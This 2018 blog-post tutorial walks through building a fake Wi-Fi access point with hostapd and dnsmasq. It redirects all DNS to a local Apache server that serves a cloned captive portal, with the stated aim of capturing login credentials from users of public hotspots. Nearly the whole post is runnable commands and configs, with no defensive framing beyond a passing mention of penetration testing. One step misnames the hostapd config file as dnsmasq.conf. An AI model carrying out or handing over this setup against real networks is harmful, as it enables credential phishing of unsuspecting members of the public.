---
layout: post
comments: true
title:  "Building a Fake Access Point and Using a Captive Portal to Get Login Credentials"
date:   2018-12-23 21:26:27
categories: Kali, DHCP, hostapd, DNS, apache, wireshark
---

 Note: for this project I will presume that you have already cloned a captive portal of an open business network that you usually would see in airports, hotel lobbies, coffee shops, and other venues that offer free Wi-Fi hot spots. Also, I will presume you have a wireless adapter that supports monitor mode and packet injection with Kali Linux installed (or other penetration testing OS installed). Yayy! Now let's move on to the main course of this documentation.

Below I have documented the process on how to manually create a fake Access Point (AP). However, in order to build a fake AP, one needs to understand the main components of a wifi network. These components are:

1. A wifi card (router) in order to broadcast the signal of an AP. (I will use hostapd tool to broadcast the signal)
2. A DHCP server to give IP addresses to clients that connect to our AP. (I will use dnsmasq tool as DHCP server)
3. A DNS server to handle DNS requests. (I will use dnsmasq tool as a DNS server)
* dnsmasq tool is rather convenient to use, since it can be used as a DHCP and DNS server at the same time!

* To install hostapd and dnsmasq, type the below command in terminal.  
```shell
apt-get install hostapd dnsmasq
```

1. After installing hostapd and dnsmasq, connect your wireless adapter (ifconfig to confirm this). Once adapter is connected do:
```shell
service network-manager stop
```
(Reason to stop network manager is so that it does not prevent the fake AP from broadcasting a wifi signal)

2. Next, we should enable IP forwarding so that packets can flow through the computer without being dropped. Not only that, we must also delete any IP table rules that might interfere with what we are trying to achieve. Hence, the below commands must be entered in the terminal to clear any firewall rules that might be redirecting packets to somewhere else.
```shell
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables -P FORWARD ACCEPT
```
(By default there should not be any IP table rules, however to be on the safe side, if a program modifies and adds IP tables rules then the fake AP will fail, hence the following commands are a precaution.)

3. Next, we will configure dnsmasq to be used as a DHCP server and DNS server. Here, copy the below code and save it in a file called dnsmasq.conf
```shell
#Set the wifi interface
interface=wlan0
#Set the ip range that can be given to clients
dhcp-range=10.0.0.10,10.0.0.100,8h
#Set the gateway IP address
dhcp-option=3,10.0.0.1
#Set dns server address
dhcp-option=6,10.0.0.1
#Redirect all requests to 10.0.0.1
address=/#/10.0.0.1
```
(The first line that says interface can be found by doing ifconfig and this interface is the one that you wireless adapter uses. The second line states that the range is from 10 to 100 and each ip can last for 8 hours. The third line states the IP of wlan0, usually the 1st IP is used for the the gateway/router and the same config is used for the fourth line. The fifth line states to redirect any request to router's IP)

4. In terminal type the following command to start DHCP server and DNS server.
```shell
dnsmasq -C /root/Downloads/fake-ap/dnsmasq.conf
```
(Note: make sure you change the above path to where you saved the dnsmasq.conf file)

5. Next, we will configure hostapd to start fake AP, in order to allow people to connect to it. Here, copy the below code and save it in a file called dnsmasq.conf
```shell
#Set wifi interface
interface=wlan0
#Set network name
ssid=FakeAP
#Set channel
channel=1
#Set driver
driver=nl80211
```
(Note: when you set the network name, make sure it has the same name as the captive portal and you can feel free to add a version to it like "FakeAP V2")

6. In terminal type the following command to start hostapd and to begin broadcasting a signal.
```shell
hostapd /root/Downloads/fake-ap/hostapd.conf -B
```
(Here, -B is used so that it will execute the above command in the background. Also, make sure you change the above path to where you saved the hostapd.conf file)

7. Next, we will configure wlan0 (or whatever interface that your running) to have an IP address of 10.0.0.1
```shell
ifconfig wlan0 10.0.0.1 netmask 255.255.255.0
```
(Note: change interface to the one you are using, in my case its wlan0. The reason we use 10.0.0.1 is because this is the ip address that is used by the dnsmasq.conf and all the requests is configured to go to this IP. Here, 255.255.255.0 address is the most common subnet mask used on computers connected to Internet Protocol (IPv4) networks)

8. Start Web server to launch the cloned captive portal. Hence, when the client clicks on the fake AP the captive portal web page is displayed.
```shell
service apache2 start
```
